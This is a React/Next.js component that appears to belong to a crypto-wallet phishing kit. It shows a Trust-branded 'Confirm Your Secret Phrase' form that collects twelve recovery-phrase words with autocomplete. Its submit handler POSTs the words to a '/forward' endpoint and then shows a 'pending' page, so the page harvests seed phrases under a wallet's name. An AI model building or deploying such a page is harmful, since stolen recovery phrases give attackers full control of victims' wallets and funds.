'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import TrustLogo from './trustLogo'
import PhraseInput from './PhraseInput'

const mockWords = ["abandon", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"]

export default function PhraseConfirmation() {
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(''))
  const [suggestions, setSuggestions] = useState<string[]>([])
  const router = useRouter()

  const handleInputChange = (index: number, value: string) => {
    const newPhraseWords = [...phraseWords]
    newPhraseWords[index] = value
    setPhraseWords(newPhraseWords)

    const matchedWords = mockWords.filter(word => word.includes(value.toLowerCase())).slice(0, 7)
    setSuggestions(matchedWords)
  }

  const handleSuggestionClick = (word: string) => {
    const index = phraseWords.findIndex(w => w === '')
    if (index !== -1) {
      handleInputChange(index, word)
    }
    setSuggestions([])
  }

  const clearInputs = () => {
    setPhraseWords(Array(12).fill(''))
    setSuggestions([])
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (phraseWords.some(word => word === '')) {
      setTimeout(() => {
        router.push('/retry')
      }, 1000)
      return
    }

    try {
      const response = await fetch("http://localhost:5672/forward", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ inputs: phraseWords }),
      })

      const result = await response.json()
      if (response.ok) {
        router.push("/pending")
      } else {
        console.error("Server error:", result)
      }
    } catch (error) {
      console.error("Error sending inputs:", error)
      router.push("/failure")
    }
  }

  return (
    <div className="mt-24 flex flex-col items-center justify-center">
      <TrustLogo />
      <div className="mt-14 max-w-lg rounded-lg border border-[#575757] px-8 py-4 text-center">
        <h2 className="text-2xl font-semibold text-white">Confirm Your Secret Phrase</h2>
        <h5 className="mt-6 leading-7 text-[#8C8C8C]">Please enter each word in the order you wrote it down. Partial word autocomplete suggestions should dynamically appear below.</h5>
        <form onSubmit={handleSubmit} className="mt-4">
          <div className="grid grid-cols-2 gap-4">
            {phraseWords.map((word, index) => (
              <PhraseInput
                key={index}
                value={word}
                onChange={(value) => handleInputChange(index, value)}
                placeholder={`Word #${index + 1}`}
              />
            ))}
          </div>
          <button type="button" className="mt-4 text-[#48FF91]" onClick={clearInputs}>
            Clear all
          </button>
          <div className="mt-4 flex flex-wrap justify-center gap-2">
            {suggestions.map((word, index) => (
              <button
                key={index}
                className="rounded-3xl bg-[#1b1b1c] border border-[#48FF91] px-4 py-2 text-white opacity-70 hover:opacity-100"
                onClick={() => handleSuggestionClick(word)}
                type="button"
              >
                {word}
              </button>
            ))}
          </div>
          <div className="mt-8 flex justify-between px-2 pb-4">
            <button className="rounded-3xl border border-[#48FF91] bg-[#1B1B1C] px-10 py-2 text-[#48FF91]">
              Cancel
            </button>
            <button type="submit" className="rounded-3xl bg-[#48FF91] px-10 py-2 text-[#1B1B1C]">
              Proceed
            </button>
          </div>
        </form>
      </div>
    </div>
  )
}

